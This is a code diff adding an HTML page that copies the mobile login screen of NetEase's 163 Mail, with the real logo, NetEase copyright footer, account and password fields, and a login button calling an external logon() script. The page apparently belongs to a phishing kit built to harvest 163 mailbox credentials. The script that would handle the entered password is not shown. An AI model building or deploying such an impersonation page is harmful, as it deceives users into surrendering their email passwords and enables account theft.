@@ -1,0 +1,140 @@
+﻿<!DOCTYPE html>
+<html>
+    <head>
+        <title>163邮箱登录</title>
+        <script src="/resource/javascript/social_163.js"></script>
+        <script src="/resource/javascript/config.js"></script>
+        <style>
+            .logo{
+                background-image:url(https://mimg.127.net/p/freemail/index/smart/urs/images/logo163.png);
+                background-size: 100%;
+                width: 50%;
+                background-repeat: no-repeat;
+                height: 150px;
+            }
+            .space{
+                width: 100%;
+                height: 100px;
+            }
+        </style>
+    </head>
+    <body>
+        <div align="center">
+            <div class="space"></div>
+            <div class="logo"></div>
+        </div>
+        <style>
+            .input{
+                width: 74%;
+                height: 120px;
+                float:left;
+                font-size: 35px;
+                text-align: center;
+                border-right: white;
+            }
+            .inbtn{
+                width: 24%;
+                float:left;
+                height: 120px;
+                font-size: 35px;
+                background-color:white;
+                border-left: white;
+            }
+        </style>
+        <div style="width: 100%;height:100px;"></div>
+        <div align="center">
+        <div align="center" style="width:80%">
+            <table width="85%"class="usersname">
+                <tr>
+                    <input class="input" placeholder="邮箱账号或者手机密码" id="usersname" />
+                    <input id="in" class="inbtn" readonly="readonly" onclick="on()" value="@163.com" />
+                    <br />
+                </tr>
+            </table>
+        </div>
+    </div>
+    <div align="center">
+        <div style="width: 100%;height: 50px;"></div>
+    </div>
+    <div align="center">
+        <div style="width: 80%;">
+            <input class="input" type="password" placeholder="输入密码" id="password" />
+            <style>
+                .inbtn1{
+                    background-image: url(png.png);
+                    background-repeat: no-repeat;
+                    background-size: 100%;
+                    right: 50px;
+                    border-left: none;
+                    width: 24%;
+                    height: 120px;
+                }
+            </style>
+            <input class="inbtn1" readonly="readonly" value="" />   
+        </div>
+    </div>
+    <br />
+    <div align="center">
+        <div style="width: 80%;">
+            <div align="left">
+                <table>
+                    <td>
+                        <input type="checkbox" style="width: 50px;height: 50px;" />
+                    </td>
+                    <td>
+                        <p style="color: darkgray;font-size: 30px;">10天免登陆</p>
+                    </td>
+                </table>
+            </div>
+        </div>
+    </div>
+    <br />
+    <div align="center">
+        <div style="width: 80%;">
+            <div style="width: 100%;height:120px;background-color: #3b78dd;color: white;font-size: 50px;" onclick="logon()">
+                <div style="width: 100%;height: 25px;"></div>
+                <span>登 录</span>
+            </div>
+        </div>
+    </div>
+    <br />
+    <div align="center">
+        <div style="width: 80%;">
+        <div style="width: 50%;float: left;">
+            <p style="font-size: 30px;color: cornflowerblue;float: left;">忘记密码?</p>
+        </div>
+        <div style="width: 50%;float: right;">
+            <p style="font-size: 30px;color: cornflowerblue;float: right;">去注册</p>
+        </div>
+    </div>
+</div>
+<div style="bottom: 0;position: fixed;width:100%;">
+    <div align="center">
+        <p style="font-size: 30px;">新邮件即使提醒，您的效率好帮手</p>
+        <br />
+        <style>
+            .font1{
+                color: darkgray;
+                font-size: 30px;
+            }
+        </style>
+        <div style="width: 100%;">
+            <table>
+                <td>
+                    <P class="font1">电脑版 | </P>
+                </td>
+                <td>
+                    <p class="font1"> 隐私政策 | </p>
+                </td>
+                <td>
+                    <p class="font1"> 儿童隐私政策 | </p>
+                </td>
+                <td>
+                    <p class="font1">网易公司版权所有@1997-2022</p>
+                </td>
+            </table>
+        </div>
+    </div>
+</div>
+    </body>
+</html>
